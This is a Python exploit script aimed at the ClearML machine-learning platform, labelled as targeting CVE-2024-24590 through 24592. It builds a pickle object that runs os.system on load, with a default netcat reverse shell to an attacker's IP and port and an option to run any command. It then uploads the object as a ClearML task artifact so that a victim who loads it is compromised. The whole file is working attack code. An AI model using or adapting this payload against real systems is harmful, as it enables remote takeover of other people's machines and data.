import os
import argparse
from clearml import Task

# CÃ³digos de color ANSI
RED = "\033[31m"
GREEN = "\033[32m"
BLUE = "\033[34m"
YELLOW = "\033[33m"
CYAN = "\033[36m"
MAGENTA = "\033[35m"
WHITE = "\033[37m"
RESET = "\033[0m"

def create_pickle(attacker_ip=None, attacker_port=None, cmd=None):
    class RunCommand:
        def __reduce__(self):
            command_str = cmd if cmd else f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {attacker_ip} {attacker_port}>/tmp/f'
            return (os.system, (command_str,))

    command = RunCommand()
    return command

def upload_pickle(project_name, task_name, command):
    task = Task.init(project_name=project_name, task_name=task_name)
    task.upload_artifact(name='pickle_artifact', artifact_object=command)

    tag_question = input(f"{YELLOW}[*] Do you want to set a tag to the current task? [y/n] {RESET}")

    if tag_question.lower() == 'y':
        task_tag = input(f"{YELLOW}[*] Please enter the tag you want to set: {RESET}")
        task.set_tags([task_tag])

    task.close()
    print(f"{GREEN}[+] Task successfully closed.{RESET}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=f'{YELLOW}Script for CVE-2024-24590, CVE-2024-24591 & CVE-2024-24592. Obtain simple RevShell.{RESET}')

    subparsers = parser.add_subparsers(dest='mode', required=True, help=f'{BLUE}Modes of operation{RESET}')

    parser_a = subparsers.add_parser('default', help=f'{MAGENTA}Default mode requires attacker_ip and attacker_port{RESET}')
    parser_a.add_argument('project_name', type=str, help=f'{WHITE}ClearML Project name.{RESET}')
    parser_a.add_argument('task_name', type=str, help=f'{WHITE}Malicious task name (Optional. Default is malicious_task).{RESET}', default='malicious_task', nargs='?')
    parser_a.add_argument('attacker_ip', type=str, help=f'{WHITE}Attacker IP.{RESET}')
    parser_a.add_argument('attacker_port', type=str, help=f'{WHITE}Attacker Port.{RESET}')

    parser_b = subparsers.add_parser('cmd', help=f'{MAGENTA}Command mode requires --cmd{RESET}')
    parser_b.add_argument('project_name', type=str, help=f'{WHITE}ClearML Project name.{RESET}')
    parser_b.add_argument('task_name', type=str, help=f'{WHITE}Malicious task name (Optional. Default is malicious_task).{RESET}', default='malicious_task', nargs='?')
    parser_b.add_argument('--cmd', type=str, required=True, help=f'{WHITE}Command to execute.{RESET}')

    args = parser.parse_args()

    if args.mode == 'default':
        command = create_pickle(args.attacker_ip, args.attacker_port)
    elif args.mode == 'cmd':
        command = create_pickle(cmd=args.cmd)

    print(f"{GREEN}[+] Creating pickle file...{RESET}")
    upload_pickle(args.project_name, args.task_name, command)
    print(f"{GREEN}[+] Pickle file uploaded successfully.{RESET}")
    print(f"{GREEN}[+] The exploitation has been successful. Check your listener.{RESET}")












